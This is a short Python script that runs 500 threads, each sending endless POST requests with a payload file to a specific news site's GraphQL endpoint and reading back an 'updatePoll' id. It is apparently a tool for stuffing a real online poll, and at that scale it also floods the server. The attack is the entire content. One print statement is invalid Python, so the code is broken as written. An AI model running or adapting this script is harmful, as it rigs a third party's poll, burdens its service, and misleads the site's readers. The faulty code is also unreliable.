#!/usr/bin/env python3

import json
import requests
import threading

url = 'https://radar.somoynews.tv/graphql'

headers = {'Authorization' : '', 'Accept' : 'application/json', 'Content-Type' : 'application/json'}



def post_request():
    while True:
        rdata = requests.post(url, data=open('payload.json', 'rb'), headers=headers)
        # print(rdata.text)
        j = json.loads(rdata.text)
        print(j['data']['updatePoll']['id'] : '')

threads = [] 
for i in range(500): 
    t = threading.Thread(target=post_request) 
    t.daemon = True 
    threads.append(t) 

for i in range(500): 
    threads[i].start() 

for i in range(500):
    threads[i].join() 


